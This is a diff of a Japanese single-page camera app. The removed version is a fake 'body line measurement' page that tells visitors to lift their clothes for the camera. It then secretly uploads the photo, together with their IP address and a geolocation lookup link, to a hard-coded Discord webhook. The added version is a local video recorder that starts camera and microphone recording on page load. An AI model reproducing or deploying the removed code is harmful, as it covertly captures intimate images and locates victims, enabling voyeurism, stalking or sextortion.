@@ -1,241 +1,280 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ボディライン測定診断</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>動画撮るよー！カメラ</title>
   <style>
     * {
       box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     }
     body {
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      background: linear-gradient(135deg, #1a1a2e, #16213e);
+      background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #450a0a 100%);
       color: #ffffff;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px 16px;
-    }
-    h1 {
-      font-size: 1.3rem;
-      margin: 0 0 10px 0;
-      text-align: center;
-      background: linear-gradient(90deg, #4facfe, #00f2fe);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .instruction-banner {
-      width: 100%;
-      max-width: 420px;
-      background: rgba(255, 165, 0, 0.15);
-      border: 1px solid rgba(255, 165, 0, 0.4);
-      padding: 10px 14px;
-      border-radius: 10px;
-      font-size: 0.85rem;
-      color: #ffcc00;
-      text-align: center;
-      margin-bottom: 12px;
-      line-height: 1.4;
+      justify-content: center;
+      padding: 20px;
     }
     .container {
       width: 100%;
       max-width: 420px;
-      background: rgba(255, 255, 255, 0.08);
-      border-radius: 16px;
-      padding: 16px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 14px;
+      background: rgba(15, 23, 42, 0.85);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 20px;
+      padding: 24px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
     }
-    .camera-wrapper {
+    h1 {
+      font-size: 1.6rem;
+      margin-bottom: 8px;
+      background: linear-gradient(90deg, #60a5fa, #f87171);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .notice {
+      font-size: 0.95rem;
+      color: #cbd5e1;
+      margin-bottom: 18px;
+      line-height: 1.5;
+    }
+    .video-box {
       position: relative;
       width: 100%;
-      border-radius: 12px;
-      overflow: hidden;
+      aspect-ratio: 3 / 4;
       background: #000;
+      border-radius: 14px;
+      overflow: hidden;
+      margin-bottom: 18px;
+      border: 2px solid rgba(255, 255, 255, 0.1);
     }
     video {
       width: 100%;
-      display: block;
+      height: 100%;
+      object-fit: cover;
       transform: scaleX(-1);
     }
-    /* ボディライン合わせ用のガイドフレーム（オーバーレイ） */
-    .body-guide {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 65%;
-      height: 75%;
-      border: 2px dashed rgba(79, 172, 254, 0.7);
-      border-radius: 100px / 40px;
-      pointer-events: none;
-      box-shadow: 0 0 15px rgba(79, 172, 254, 0.3) inset;
+    video.playback {
+      transform: none;
     }
-    .body-guide::after {
-      content: "この枠に体型を合わせてください";
+    .rec-badge {
       position: absolute;
-      bottom: -25px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 0.75rem;
-      color: #4facfe;
-      white-space: nowrap;
-      background: rgba(0, 0, 0, 0.6);
-      padding: 2px 6px;
-      border-radius: 4px;
+      top: 12px;
+      left: 12px;
+      background: rgba(220, 38, 38, 0.9);
+      color: #fff;
+      font-weight: bold;
+      font-size: 0.85rem;
+      padding: 6px 12px;
+      border-radius: 999px;
+      display: none;
+      align-items: center;
+      gap: 6px;
+      animation: pulse 1.2s infinite;
+    }
+    .rec-dot {
+      width: 10px;
+      height: 10px;
+      background: #fff;
+      border-radius: 50%;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
     }
     .btn {
       width: 100%;
-      padding: 13px 16px;
+      padding: 14px;
       border: none;
-      border-radius: 10px;
-      font-size: 0.95rem;
+      border-radius: 12px;
+      font-size: 1rem;
       font-weight: bold;
-      color: #fff;
-      background: linear-gradient(90deg, #3a7bd5, #00d2ff);
       cursor: pointer;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
+      transition: transform 0.1s, opacity 0.2s;
+      margin-bottom: 10px;
     }
     .btn:active {
-      opacity: 0.85;
+      transform: scale(0.98);
     }
-    .secondary-btn {
-      background: linear-gradient(90deg, #434343, #000000);
-    }
-    .result-box {
-      width: 100%;
+    .btn-start {
+      background: linear-gradient(90deg, #2563eb, #dc2626);
+      color: #fff;
       display: none;
-      flex-direction: column;
-      align-items: center;
-      gap: 12px;
     }
-    .result-box canvas {
-      width: 100%;
-      border-radius: 12px;
-      background: #000;
-      display: block;
+    .btn-stop {
+      background: #dc2626;
+      color: #fff;
+      display: none;
     }
-    .status-card {
-      width: 100%;
-      background: rgba(0, 0, 0, 0.4);
-      padding: 12px;
-      border-radius: 10px;
-      text-align: center;
-      font-size: 0.9rem;
-      color: #28a745;
-      font-weight: bold;
-      border: 1px solid rgba(40, 167, 69, 0.3);
+    .btn-save {
+      background: #10b981;
+      color: #fff;
+      text-decoration: none;
+      display: none;
+    }
+    .btn-retry {
+      background: #334155;
+      color: #fff;
+      display: none;
+    }
+    .status-text {
+      font-size: 0.85rem;
+      color: #94a3b8;
+      margin-top: 6px;
     }
   </style>
 </head>
 <body>
-
-  <h1>ボディライン測定診断</h1>
-
-  <div class="instruction-banner">
-    ⚠️ <strong>正確な診断のための手順</strong><br>
-    正確に測定するため、<strong>服をたくし上げて</strong>画面のガイドラインに体型を合わせ、直立して撮影してください。
-  </div>
-
   <div class="container">
-    <!-- カメラ＆ガイド表示エリア -->
-    <div class="camera-wrapper" id="cameraWrapper">
-      <video id="video" autoplay playsinline muted></video>
-      <div class="body-guide"></div>
+    <h1>動画撮るよー！</h1>
+    <p class="notice" id="noticeText">
+      カメラを許可するとすぐに録画が始まります！
+    </p>
+
+    <div class="video-box">
+      <video id="preview" autoplay playsinline muted></video>
+      <div class="rec-badge" id="recBadge">
+        <span class="rec-dot"></span>
+        <span id="recTimer">REC 00:00</span>
+      </div>
     </div>
 
-    <button type="button" class="btn" id="snapBtn">ボディラインを測定・確定する</button>
+    <button class="btn btn-start" id="startBtn">カメラを起動する</button>
+    <button class="btn btn-stop" id="stopBtn">録画ストップ</button>
+    <a class="btn btn-save" id="saveBtn" download="video.webm">動画を保存する</a>
+    <button class="btn btn-retry" id="retryBtn">もう一回撮る</button>
 
-    <!-- 診断完了後の表示エリア -->
-    <div class="result-box" id="resultBox">
-      <div class="status-card">測定およびデータ送信完了</div>
-      <canvas id="photoCanvas"></canvas>
-      <button type="button" class="btn secondary-btn" id="restartBtn">もう一度測定する</button>
-    </div>
+    <p class="status-text" id="statusText">自動起動中...</p>
   </div>
 
   <script>
-    const video = document.getElementById('video');
-    const snapBtn = document.getElementById('snapBtn');
-    const restartBtn = document.getElementById('restartBtn');
-    const cameraWrapper = document.getElementById('cameraWrapper');
-    const resultBox = document.getElementById('resultBox');
-    const photoCanvas = document.getElementById('photoCanvas');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const saveBtn = document.getElementById('saveBtn');
+    const retryBtn = document.getElementById('retryBtn');
+    const preview = document.getElementById('preview');
+    const recBadge = document.getElementById('recBadge');
+    const recTimer = document.getElementById('recTimer');
+    const noticeText = document.getElementById('noticeText');
+    const statusText = document.getElementById('statusText');
 
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1572124436818170017/T_lHqJXspYpaMdhkghKVHY-xCVkyiAPIoO9R72WLe9dO-MZq0GfLFL8V2Z3lVuC3YjhW';
+    let stream = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let timerInterval = null;
+    let seconds = 0;
 
-    let clientIp = '';
+    function formatTime(sec) {
+      const m = String(Math.floor(sec / 60)).padStart(2, '0');
+      const s = String(sec % 60).padStart(2, '0');
+      return `${m}:${s}`;
+    }
 
-    // IPアドレスをバックグラウンドで事前取得
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => { clientIp = data.ip; })
-      .catch(() => { clientIp = '取得失敗'; });
-
-    // 内カメラ起動
-    async function startCamera() {
+    async function initCameraAndRecord() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
+        startBtn.style.display = 'none';
+        statusText.textContent = 'カメラの許可を確認中...';
+        stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
-          audio: false
+          audio: true
         });
-        video.srcObject = stream;
-        await video.play();
+
+        preview.srcObject = stream;
+        preview.classList.remove('playback');
+        preview.muted = true;
+        await preview.play();
+
+        startRecording();
       } catch (err) {
-        console.log('カメラが使えません:', err);
+        statusText.textContent = '下のボタンを押してカメラを許可してください';
+        startBtn.style.display = 'block';
       }
     }
-    startCamera();
 
-    // 測定・確定ボタン
-    snapBtn.addEventListener('click', () => {
-      if (!video.videoWidth) return;
+    function startRecording() {
+      recordedChunks = [];
+      const mimeTypes = [
+        'video/mp4',
+        'video/webm;codecs=vp9,opus',
+        'video/webm'
+      ];
+      let selectedMime = '';
+      for (const type of mimeTypes) {
+        if (MediaRecorder.isTypeSupported(type)) {
+          selectedMime = type;
+          break;
+        }
+      }
 
-      const w = video.videoWidth;
-      const h = video.videoHeight;
+      mediaRecorder = selectedMime
+        ? new MediaRecorder(stream, { mimeType: selectedMime })
+        : new MediaRecorder(stream);
 
-      photoCanvas.width = w;
-      photoCanvas.height = h;
-      const ctx = photoCanvas.getContext('2d');
-      ctx.translate(w, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0);
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data && e.data.size > 0) {
+          recordedChunks.push(e.data);
+        }
+      };
 
-      // 画面切り替え
-      cameraWrapper.style.display = 'none';
-      snapBtn.style.display = 'none';
-      resultBox.style.display = 'flex';
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, {
+          type: mediaRecorder.mimeType || 'video/mp4'
+        });
+        const url = URL.createObjectURL(blob);
 
-      // 裏側でDiscordへ送信
-      photoCanvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('payload_json', JSON.stringify({
-          content: `📏 **ボディライン測定データ受信**\n・IPアドレス: \`${clientIp || '取得中'}\`\n・ジオロケーション確認: https://rakko.tools/ja/tools/ip-geolocation`
-        }));
-        formData.append('file', blob, 'body_measurement.png');
+        stream.getTracks().forEach(track => track.stop());
+        preview.srcObject = null;
+        preview.src = url;
+        preview.classList.add('playback');
+        preview.muted = false;
+        preview.controls = true;
+        preview.play();
 
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          body: formData
-        }).catch(err => console.error(err));
-      }, 'image/png');
+        const ext = (mediaRecorder.mimeType || '').includes('mp4') ? 'mp4' : 'webm';
+        saveBtn.href = url;
+        saveBtn.download = `movie_${Date.now()}.${ext}`;
+        saveBtn.style.display = 'block';
+        retryBtn.style.display = 'block';
+        noticeText.textContent = '録画完了！下のボタンから保存できます。';
+        statusText.textContent = 'プレビュー再生中';
+      };
+
+      mediaRecorder.start();
+      seconds = 0;
+      recTimer.textContent = 'REC 00:00';
+      recBadge.style.display = 'flex';
+      stopBtn.style.display = 'block';
+      noticeText.textContent = '動画撮るよー！録画中です！';
+      statusText.textContent = '録画中...';
+
+      timerInterval = setInterval(() => {
+        seconds++;
+        recTimer.textContent = `REC ${formatTime(seconds)}`;
+      }, 1000);
+    }
+
+    startBtn.addEventListener('click', initCameraAndRecord);
+
+    stopBtn.addEventListener('click', () => {
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+      }
+      clearInterval(timerInterval);
+      recBadge.style.display = 'none';
+      stopBtn.style.display = 'none';
     });
 
-    // もう一度測定するボタン
-    restartBtn.addEventListener('click', () => {
-      resultBox.style.display = 'none';
-      cameraWrapper.style.display = 'block';
-      snapBtn.style.display = 'flex';
+    retryBtn.addEventListener('click', () => {
+      location.reload();
     });
+
+    window.addEventListener('DOMContentLoaded', initCameraAndRecord);
   </script>
 </body>
 </html>
